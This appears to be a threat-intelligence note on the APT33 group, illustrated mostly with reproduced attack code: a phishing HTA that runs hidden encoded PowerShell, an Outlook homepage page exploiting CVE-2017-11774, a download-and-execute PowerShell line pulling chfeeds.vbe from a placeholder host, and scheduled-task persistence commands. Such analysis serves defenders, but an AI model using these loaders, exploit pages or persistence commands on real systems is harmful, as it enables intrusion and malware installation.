# APT33

## Features

1. When sending phishing email, it will contain a link to a malicious HTA file, which will download the back door of the organization.

```HTA
# Please Wait. Loading ...
<h1>Please Wait. Loading ...</h1>
<head>
<title>Supply Specialist , Riyadh,Alsalam Aircraft Company</title>
</head>

'''
 <script>
a=new ActiveXObject("WScript.Shell");
a.run('%windir%\\System32\\cmd.exe /c powershell -window hidden -enc [Command after coding]', 0);
//Call PowerShell download backdoor
</script>

'''
```

2. Make the target download malicious files by setting the Outlook home page security bypass vulnerability (CVE-2017-11774).

```html
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Outlook</title>
<script id=clientEventHandlersVBS language=vbscript>
<!--
  Sub window_onload()
         Set Application = ViewCtll.OutlookApplication
         Set cmd = Application.CreateObject("Wscript.shell')
         //Create Wscript.shell type object
         cmd.Run "cmd /c powershell.exe-w l -noni -nop -en  [Base64 encryption command]", 0, True
         //Use PowerShell to download backdoor
  End sub
-->
</script>
</head>

<body>
  <object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"></object>
  //嵌入对象OutlookViewCtl CLSID
</body>
</html>
```

3. Write a malicious Url address in the phishing email. When the victim clicks it, the HTA file will be downloaded, and the file will download chfeeds.vbe to act as a downloader.

```HTA
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('https://IP:port/chfeeds.vbe');
```

4. Use the JavaScript command to create a scheduled task using schtasks. The scheduled task will execute chfeeds.vbe download at a fixed point every day.

```JavaScript
a.	run('%windir%\\System32\\cmd.exe /c PowerShell -window hidden schtasks.exe /CREATE /SC DAILY /TN "1" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 01:00 /f
//Create a scheduled task named 1 and run chfeeds.vbe at 1:00 every day
&& schtasks.exe /CREATE /SC DAILY /TN "3" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 03:00 /f && schtasks.exe /CREATE /SC DAILY /TN "5" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 05:00 /f && schtasks.exe /CREATE /SC DAILY /TN "7" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 07:00 /f && schtasks.exe /CREATE /SC DAILY /TN "9" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 09:00 /f && schtasks.exe /CREATE /SC DAILY /TN "11" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 11:00 /f && schtasks.exe /CREATE /SC DAILY /TN "13" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 13:00 /f && schtasks.exe /CREATE /SC DAILY /TN "15" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 15:00 /f && schtasks.exe /CREATE /SC DAILY /TN "17" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 17:00 /f && schtasks.exe /CREATE /SC DAILY /TN "19" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 19:00 /f && schtasks.exe /CREATE /SC DAILY /TN "21" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 21:00 /f && schtasks.exe /CREATE /SC DAILY /TN "23" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 23:00 /f ')
```
